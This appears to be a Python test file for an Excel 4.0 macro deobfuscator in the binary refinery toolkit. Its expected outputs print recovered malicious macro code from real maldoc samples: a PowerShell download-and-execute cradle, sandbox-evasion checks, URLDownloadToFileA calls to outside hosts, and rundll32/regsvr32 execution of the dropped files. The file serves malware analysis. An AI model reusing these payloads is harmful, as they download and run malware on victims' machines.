from __future__ import annotations

import random

from refinery.lib.excel import synthesize_formula
from refinery.lib.scripts.xlm import XlmEngine, XlmView
from refinery.lib.scripts.xlm.deobfuscation import deobfuscate, sweep
from refinery.lib.scripts.xlm.model import XlmCell
from test import TestBase
from test.lib.excel.samples import (
    XLM_MACRO_ASSIGN_BIFF8,
    XLM_MACRO_FORMULA_XLSM,
    XLM_MACRO_NAMES_BIFF8,
    XLM_MACRO_RPN_BIFF8,
    XLM_MACRO_TEXT_XLSM,
)
from test.lib.scripts.xlm.modify import drop_defined_names

_MALDOC = 'dc44bbfc845fc078cf38b9a3543a32ae1742be8c6320b81cf6cd5a8cee3c696a'


def _cells(view: XlmView) -> set[tuple[str, int, int]]:
    return {
        (macrosheet.name, cell.row, cell.col)
        for macrosheet in view.macrosheets()
        for cell in macrosheet.body
        if isinstance(cell, XlmCell)
    }


def _trace(view: XlmView) -> list[tuple[str, int, int, str, str]]:
    return [
        (step.sheet, step.row, step.col, step.status.name, step.text)
        for step in XlmEngine(view).run()
    ]


def _listing(view: XlmView) -> dict[tuple[str, int, int], str]:
    return {
        (macrosheet.name, cell.row, cell.col): synthesize_formula(cell.formula)
        for macrosheet in view.macrosheets()
        for cell in macrosheet.body
        if isinstance(cell, XlmCell) and cell.formula is not None
    }


class TestDeadCellSweep(TestBase):

    _TRACE_SAMPLES = [
        XLM_MACRO_NAMES_BIFF8,
        XLM_MACRO_ASSIGN_BIFF8,
        XLM_MACRO_RPN_BIFF8,
        XLM_MACRO_TEXT_XLSM,
        XLM_MACRO_FORMULA_XLSM,
    ]

    def _sweeped(self, data: bytes, start_point: str = '') -> XlmView:
        view = XlmView(data)
        sweep(view, start_point)
        return view

    def test_the_trace_of_every_sample_is_the_same_before_and_after_the_sweep(self):
        for data in self._TRACE_SAMPLES:
            with self.subTest(sample=data[:8].hex()):
                self.assertEqual(_trace(XlmView(data)), _trace(self._sweeped(data)))

    def test_the_names_sample_keeps_only_the_entry_column_below_its_reference(self):
        self.assertEqual(
            _cells(self._sweeped(XLM_MACRO_NAMES_BIFF8)),
            {('Acf444', 9590, 1), ('Acf444', 9591, 1), ('Acf444', 29999, 1), ('Acf444', 30009, 1)},
        )

    def test_the_assign_sample_loses_only_its_two_dead_cells(self):
        default = _cells(XlmView(XLM_MACRO_ASSIGN_BIFF8))
        swept = _cells(self._sweeped(XLM_MACRO_ASSIGN_BIFF8))
        self.assertEqual(default - swept, {('sod', 65, 65), ('sod', 66, 65)})
        self.assertEqual(len(swept), len(default) - 2)

    def test_the_rpn_padding_stays_because_the_program_reads_it(self):
        default = _cells(XlmView(XLM_MACRO_RPN_BIFF8))
        swept = _cells(self._sweeped(XLM_MACRO_RPN_BIFF8))
        self.assertEqual(swept, default)

    def test_the_start_point_anchors_the_sweep_where_no_name_points_anywhere(self):
        nameless = drop_defined_names(XLM_MACRO_TEXT_XLSM)
        self.assertEqual(
            _cells(self._sweeped(nameless, 'Doc1!AZ102')),
            _cells(XlmView(XLM_MACRO_TEXT_XLSM)),
        )

    def test_without_a_start_point_or_a_name_the_unreferenced_cells_go(self):
        nameless = drop_defined_names(XLM_MACRO_TEXT_XLSM)
        self.assertEqual(len(_cells(self._sweeped(nameless))), 27)

    def test_the_maldoc_listing_shrinks_without_touching_its_trace(self):
        data = self.download_sample(_MALDOC)
        plain = XlmView(data)
        before = len(_cells(plain))
        random.seed(0xBAADF00D)
        plain_trace = _trace(plain)
        random.seed(0xBAADF00D)
        self.assertEqual(plain_trace, _trace(self._sweeped(data)))
        self.assertEqual(len(_cells(self._sweeped(data))), before - 63)


class TestConstantFolding(TestBase):

    def _deobfuscated(self, data: bytes, start_point: str = '') -> XlmView:
        view = XlmView(data)
        deobfuscate(view, start_point)
        return view

    def test_the_names_sample_folds_the_command_chain_onto_its_entry_cell(self):
        listing = _listing(self._deobfuscated(XLM_MACRO_NAMES_BIFF8))
        self.assertEqual(
            listing,
            {
                ('Acf444', 9591, 1):
                    'EXEC("powershell -Command IEX (new`-OB`jeCT(\'Net.WebClient\'))'
                    '.\'DoWnloAdsTrInG\'(\'ht\'+\'tp://paste.ee/r/pLpR9\')")',
                ('Acf444', 29999, 1): 'Application.Quit',
                ('Acf444', 30009, 1): 'HALT()',
            },
        )

    def test_the_rpn_padding_folds_into_the_payloads_it_carries(self):
        view = self._deobfuscated(XLM_MACRO_RPN_BIFF8)
        self.assertEqual(len(_cells(view)), 11)
        self.assertEqual(
            _listing(view),
            {
                ('mP9mScF1m5', 41, 19): 'FORMULA("=IF(GET.WORKSPACE(13)<770, CLOSE(FALSE),)",T1)',
                ('mP9mScF1m5', 42, 19): 'FORMULA("=IF(GET.WORKSPACE(14)<381, CLOSE(FALSE),)",T3)',
                ('mP9mScF1m5', 43, 19): 'FORMULA("=IF(GET.WORKSPACE(19),,CLOSE(TRUE))",T4)',
                ('mP9mScF1m5', 44, 19): 'FORMULA("=IF(GET.WORKSPACE(42),,CLOSE(TRUE))",T5)',
                ('mP9mScF1m5', 45, 19):
                    'FORMULA("=IF(ISNUMBER(SEARCH(""Windows"",GET.WORKSPACE(1))),'
                    ' ,CLOSE(TRUE))",T6)',
                ('mP9mScF1m5', 46, 19):
                    'FORMULA("=CALL(""urlmon"",""URLDownloadToFileA"",""JJCCJJ"",0,'
                    '""https://gfhudnjv.xyz/vjd7f2js"",'
                    r'""c:\Users\Public\hff2f5o.html"",0,0)",T7)',
                ('mP9mScF1m5', 47, 19):
                    'FORMULA("=ALERT(""The workbook cannot be opened or repaired by Microsoft '
                    'Excel because it\'s corrupt."",2)",T8)',
                ('mP9mScF1m5', 48, 19):
                    'FORMULA("=CALL(""Shell32"",""ShellExecuteA"",""JJCCCJJ"",0,""open"",'
                    r'""C:\Windows\system32\rundll32.exe"",'
                    r'""c:\Users\Public\hff2f5o.html,DllRegisterServer"",0,5)",T9)',
                ('mP9mScF1m5', 49, 19): 'FORMULA("=CLOSE(FALSE)",T10)',
                ('mP9mScF1m5', 50, 19): 'WORKBOOK.HIDE("mP9mScF1m5",TRUE)',
                ('mP9mScF1m5', 51, 19): 'GOTO(T1)',
            },
        )

    def test_the_maldoc_listing_carries_its_paths_after_folding(self):
        data = self.download_sample(_MALDOC)
        listing = _listing(self._deobfuscated(data))
        self.assertEqual(len(listing), 28)
        self.assertEqual(
            listing[('Xwtrd', 21, 7)],
            'Drwrgdfghfhf(0,"http://94.140.112.209/"&Tiposa1!G11&Sheet2!K12,'
            r'"C:\ProgramData\Ropedjo1.ocx",0,0)',
        )
        self.assertEqual(
            listing[('Tiposa1', 22, 7)],
            'EXEC("regsvr32  C:\\ProgramData\\Ropedjo1.ocx")',
        )
